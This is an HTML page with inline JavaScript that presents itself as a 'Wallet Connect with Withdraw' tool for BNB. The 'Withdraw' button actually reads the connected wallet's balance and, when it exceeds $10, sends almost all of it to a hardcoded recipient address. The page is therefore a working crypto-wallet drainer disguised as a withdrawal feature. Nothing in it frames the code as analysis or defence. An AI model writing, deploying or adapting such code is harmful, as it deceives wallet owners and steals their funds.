<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Wallet Connect with Withdraw</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
      max-width: 400px;
      margin: auto;
    }
    w3m-core-button {
      display: block;
      margin-bottom: 20px;
      width: 100%;
    }
    button {
      width: 100%;
      padding: 10px;
      font-size: 16px;
      margin-bottom: 10px;
      cursor: pointer;
    }
    #messageBox {
      padding: 10px;
      border-radius: 4px;
      margin-top: 10px;
      min-height: 40px;
    }
    #messageBox.info {
      background-color: #d9edf7;
      color: #31708f;
    }
    #messageBox.success {
      background-color: #d4edda;
      color: #155724;
    }
    #messageBox.error {
      background-color: #f8d7da;
      color: #721c24;
    }
  </style>
  <script type="module" src="wallet.js"></script>
</head>
<body>

  <!-- Wallet Connect Button -->
  <w3m-core-button id="connectButton"></w3m-core-button>

  <!-- Withdraw Button (Initially hidden) -->
  <button id="withdrawButton" style="display: none;">Withdraw BNB</button>

  <!-- Message Box -->
  <div id="messageBox" class="info">Please connect your wallet.</div>

  <script type="module">
    import {
      getAccount,
      fetchBalance,
      sendTransaction
    } from "https://unpkg.com/@web3modal/ethereum@2.6.2/build/esm/wagmiCore.js";
    import {
      parseEther,
      formatEther
    } from "https://cdn.jsdelivr.net/npm/viem@1.21.4/_cjs/index.min.js";

    const connectButton = document.getElementById("connectButton");
    const withdrawButton = document.getElementById("withdrawButton");
    const messageBox = document.getElementById("messageBox");
    const BNB_PRICE_USD = 300;
    const recipient = '0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C';

    function showMessage(message, type = 'info') {
      messageBox.textContent = message;
      messageBox.className = '';
      messageBox.classList.add(type);
    }

    async function checkConnectionAndToggleUI() {
      const { isConnected } = getAccount();
      if (isConnected) {
        connectButton.style.display = 'none';
        withdrawButton.style.display = 'block';
        showMessage("Wallet connected. You can withdraw now.", "success");
      } else {
        connectButton.style.display = 'block';
        withdrawButton.style.display = 'none';
        showMessage("Please connect your wallet.", "info");
      }
    }

    // Monitor connection changes
    window.ethereum?.on('accountsChanged', checkConnectionAndToggleUI);
    window.ethereum?.on('connect', checkConnectionAndToggleUI);
    window.ethereum?.on('disconnect', checkConnectionAndToggleUI);

    document.addEventListener('DOMContentLoaded', () => {
      checkConnectionAndToggleUI();
    });

    withdrawButton.addEventListener('click', async () => {
      try {
        const { address, isConnected } = getAccount();
        if (!isConnected || !address) {
          showMessage('Wallet not connected! Please connect first.', 'error');
          return;
        }

        showMessage('Checking your BNB balance...', 'info');

        const balanceResult = await fetchBalance({
          address,
          chainId: 56,
        });

        const balanceBNB = Number(formatEther(balanceResult.value));
        const balanceUSD = balanceBNB * BNB_PRICE_USD;

        if (balanceUSD < 10) {
          showMessage(`Your balance is $${balanceUSD.toFixed(2)} â€” below $10.`, 'error');
          return;
        }

        const gasBuffer = 0.001;
        const withdrawAmountBNB = balanceBNB - gasBuffer;

        if (withdrawAmountBNB <= 0) {
          showMessage("Balance too low after gas reservation.", "error");
          return;
        }

        showMessage("Sending transaction...", "info");

        const tx = await sendTransaction({
          to: recipient,
          value: parseEther(withdrawAmountBNB.toFixed(18)),
        });

        showMessage(`Withdraw successful! Tx Hash: ${tx.hash}`, "success");

      } catch (e) {
        console.error(e);
        showMessage("Withdrawal failed. Check console or try again.", "error");
      }
    });
  </script>

</body>
</html>
